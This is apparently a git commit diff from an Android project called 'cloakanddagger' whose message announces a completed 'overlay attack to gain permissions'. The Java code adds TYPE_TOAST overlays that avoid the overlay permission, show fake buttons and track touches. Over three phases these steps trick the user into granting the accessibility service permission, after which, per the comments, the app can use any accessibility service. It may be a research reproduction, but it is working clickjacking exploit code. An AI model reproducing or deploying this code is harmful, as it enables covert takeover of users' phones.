c095485a7bab1a5ef1e40a9edad71111a287b2bf
NoahS96 <noah2296@gmail.com>
2017-10-29 20:14:53 -0500

    Overlay attack to gain permissions is complete. Added comments to clarify code.

--- app/src/main/java/andrews/cloakanddagger/SetupActivity.java
+++ app/src/main/java/andrews/cloakanddagger/SetupActivity.java
@@ -1,53 +1,37 @@
 package andrews.cloakanddagger;
 
+import android.Manifest;
 import android.content.Intent;
+import android.content.pm.PackageManager;
 import android.os.Build;
 import android.provider.Settings;
+import android.support.v4.content.ContextCompat;
 import android.support.v7.app.AppCompatActivity;
 import android.os.Bundle;
+import android.widget.Toast;
 
 
 public class SetupActivity extends AppCompatActivity {
-
-    private final int REQUEST_BIND_ACCESSIBILITY_SERVICE_PERMISSION = 100;
-    private final int REQUEST_SYSTEM_ALERT_WINDOW_PERMISSION = 200;
-
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
 
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_setup);
-        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            Intent myIntent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
-            startActivity(myIntent);
-        }
 
-        WindowSetup setup = new WindowSetup(this);
-        setup.updatePhase(this, setup.PHASE1);
+        /**Checks whether the BIND_ACCESSIBILITY_SERVICE permission is granted. If not call the startToast function from the WindowSetup class.**/
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.BIND_ACCESSIBILITY_SERVICE) != PackageManager.PERMISSION_GRANTED) {
 
-        /*if (ContextCompat.checkSelfPermission(this, Manifest.permission.BIND_ACCESSIBILITY_SERVICE) != PackageManager.PERMISSION_GRANTED) {
-            Toast.makeText(this, "No permission Bind Service", Toast.LENGTH_LONG).show();
-            //requestPermissions(new String[]{Manifest.permission.BIND_ACCESSIBILITY_SERVICE}, REQUEST_BIND_ACCESSIBILITY_SERVICE_PERMISSION);
-
-            System.out.println("Should pop dialog");
-            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.BIND_ACCESSIBILITY_SERVICE}, REQUEST_BIND_ACCESSIBILITY_SERVICE_PERMISSION);
-        } else {
-            System.out.println("Permission Granted");
-            Toast.makeText(this, "Permission Granted Bind Service", Toast.LENGTH_LONG).show();
-        }*/
-
-        /*if (ContextCompat.checkSelfPermission(this, Manifest.permission.SYSTEM_ALERT_WINDOW) != PackageManager.PERMISSION_GRANTED) {
-            Toast.makeText(this, "No permission System Alert", Toast.LENGTH_LONG).show();
-            if (ActivityCompat.shouldShowRequestPermissionRationale(this, Manifest.permission.SYSTEM_ALERT_WINDOW)) {
-
-            } else {
-
-                ActivityCompat.requestPermissions(SetupActivity.this, new String[]{Manifest.permission.SYSTEM_ALERT_WINDOW}, REQUEST_SYSTEM_ALERT_WINDOW_PERMISSION);
+            /**Opens the accessibility settings screen**/
+            if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                Intent myIntent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
+                startActivity(myIntent);
             }
+            WindowSetup setup = new WindowSetup(this);
+            setup.startToast(this);
         } else {
-            Toast.makeText(this, "Permission Granted System Alert", Toast.LENGTH_LONG).show();
-        }*/
+            Toast.makeText(this, "Permission Granted Bind Service", Toast.LENGTH_LONG).show();
+        }
 
     }
 
--- app/src/main/java/andrews/cloakanddagger/WindowSetup.java
+++ app/src/main/java/andrews/cloakanddagger/WindowSetup.java
@@ -2,7 +2,6 @@ package andrews.cloakanddagger;
 
 import android.app.Activity;
 import android.content.Context;
-import android.content.pm.ActivityInfo;
 import android.graphics.PixelFormat;
 import android.graphics.Point;
 import android.view.Display;
@@ -10,29 +9,31 @@ import android.view.Gravity;
 import android.view.MotionEvent;
 import android.view.View;
 import android.view.WindowManager;
-import android.widget.TextView;
-
-import org.w3c.dom.Text;
-
-import static android.R.attr.x;
-import static android.R.attr.y;
 
 /**
  * Created by slothlord on 10/22/17.
+ * The WindowSetup class creates a single instance of WindowManager which is used to control the
+ * setup activity.
  */
 
 public class WindowSetup {
 
-    public final int PHASE1 = 1;
-
+    /**The view found by the passed in context is treated as a type TOAST to create an overlay and
+     * avoid the SYSTEM_ALERT_WINDOW permission.
+     */
     private int type =  WindowManager.LayoutParams.TYPE_TOAST;
     private int flags = 0;
     private static WindowManager manager;
     private int width;
     private int height;
     volatile boolean fin = false;
-    volatile View overlaying_view1=null, overlaying_view2=null, overlaying_view3=null, touch_view;
+    volatile View overlaying_view1, overlaying_view2, overlaying_view3, touch_view, padding;
 
+
+    /**The constructor simply takes a context and applies it to the created WindowManager. The size of the
+     * screen is then collected to format the toast view dimensions.
+     * @param context
+     */
     public WindowSetup(Context context) {
         manager = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
         Display display = manager.getDefaultDisplay();
@@ -42,16 +43,27 @@ public class WindowSetup {
         height = size.y;
     }
 
-    public WindowManager getManager() {
-        return manager;
-    }
 
-    public void updatePhase(Context context, int phase) {
+    /**
+     * startToast begins the first phase of acquiring the BIND_ACCESSIBILITY permission. An overlaying view, which
+     * is only used to display a fake button, and a touch view, used to detect if the overlay view has been touched,
+     * are created.
+     * @param context
+     */
+    public void startToast(Context context) {
 
-        //View overlaying_view1=null, overlaying_view2=null, overlaying_view3=null, touch_view;
         final Context parent = context;
 
         manager = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
+
+        padding = View.inflate(context, R.layout.padding_view, null);
+        WindowManager.LayoutParams layoutParams_pad = new WindowManager.LayoutParams(width, height, type, flags
+                | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
+                | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
+                PixelFormat.TRANSLUCENT);
+        layoutParams_pad.gravity = Gravity.FILL;
+        manager.addView(padding, layoutParams_pad);
+
 
         overlaying_view1 = View.inflate(context, R.layout.activity_obscuring_toast, null);
         WindowManager.LayoutParams layoutParams_obs1 = new WindowManager.LayoutParams(width, 482, type, flags
@@ -61,7 +73,7 @@ public class WindowSetup {
         layoutParams_obs1.gravity = Gravity.TOP;
         manager.addView(overlaying_view1, layoutParams_obs1);
 
-        //The touch view is responsible for listening for a touch which returns true when detected
+        //The touch view is responsible for listening for a touch which calls phase2 when true
         touch_view = View.inflate(context, R.layout.touch_view, null);
         WindowManager.LayoutParams layoutParams_touch1 = new WindowManager.LayoutParams(width, height - height/3 + 53, type, flags
                 | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
@@ -81,12 +93,18 @@ public class WindowSetup {
             }
         });
         layoutParams_touch1.gravity = Gravity.BOTTOM;
+
         manager.addView(touch_view, layoutParams_touch1);
     }
 
+    /**
+     * startPhase2 does the same thing as phase 1 but the formatting of the two views is slightly different
+      * @param context
+     */
     private void startPhase2(Context context) {
 
         final Context parent = context;
+        touch_view.setVisibility(View.GONE);
 
         overlaying_view2 = View.inflate(parent, R.layout.obscuring_toast2, null);
         WindowManager.LayoutParams layoutParams_obs2 = new WindowManager.LayoutParams(width, 310, type, flags
@@ -94,7 +112,9 @@ public class WindowSetup {
                 | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,
                 PixelFormat.TRANSLUCENT);
         layoutParams_obs2.gravity = Gravity.TOP;
+
         manager.addView(overlaying_view2, layoutParams_obs2);
+        overlaying_view1.setVisibility(View.GONE);
 
         //The touch view is responsible for listening for a touch which returns true when detected
         touch_view = View.inflate(parent, R.layout.touch_view, null);
@@ -115,42 +135,56 @@ public class WindowSetup {
             }
         });
         layoutParams_touch2.gravity = Gravity.BOTTOM;
+
         manager.addView(touch_view, layoutParams_touch2);
 
     }
 
+    /**
+     * startPhase 3 adjusts the format to keep the permission dialog buttons visible which allows the
+     * permission to be granted. Once the button is pressed the app is free to use any accessibility
+     * services.
+     * @param context
+     */
     private void startPhase3(Context context) {
 
         final Context parent = context;
+        touch_view.setVisibility(View.GONE);
 
-        /**overlaying_view2 = View.inflate(parent, R.layout.obscuring_toast2, null);
-        WindowManager.LayoutParams layoutParams_obs2 = new WindowManager.LayoutParams(width, 482, type, flags
+        overlaying_view3 = View.inflate(parent, R.layout.obscuring_toast3, null);
+        WindowManager.LayoutParams layoutParams_obs3 = new WindowManager.LayoutParams(width, 230, type, flags
                 | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                 | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,
                 PixelFormat.TRANSLUCENT);
-        layoutParams_obs2.gravity = Gravity.TOP;
-        manager.addView(overlaying_view2, layoutParams_obs2);
+        layoutParams_obs3.gravity = Gravity.BOTTOM;
+
+        manager.addView(overlaying_view3, layoutParams_obs3);
+        overlaying_view2.setVisibility(View.GONE);
 
         //The touch view is responsible for listening for a touch which returns true when detected
         touch_view = View.inflate(parent, R.layout.touch_view, null);
-        WindowManager.LayoutParams layoutParams_touch2 = new WindowManager.LayoutParams(width, height - height/3 + 53, type, flags
+        WindowManager.LayoutParams layoutParams_touch3 = new WindowManager.LayoutParams(width, height/2 + 495, type, flags
                 | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                 | WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH
                 | WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
                 PixelFormat.TRANSLUCENT);
+
+        padding.setVisibility(View.GONE);
         touch_view.setOnTouchListener(new View.OnTouchListener() {
             @Override
             public boolean onTouch(View v, MotionEvent event) {
                 if(event.getAction() == MotionEvent.ACTION_OUTSIDE) {
                     System.out.println("**********************************WE DID IT!**************************");
-
+                    overlaying_view3.setVisibility(View.GONE);
+                    touch_view.setVisibility(View.GONE);
                     return true;
                 }
                 return false;
             }
         });
-        layoutParams_touch2.gravity = Gravity.BOTTOM;
-        manager.addView(touch_view, layoutParams_touch2);**/
+        layoutParams_touch3.gravity = Gravity.TOP;
+
+        manager.addView(touch_view, layoutParams_touch3);
     }
 
 }
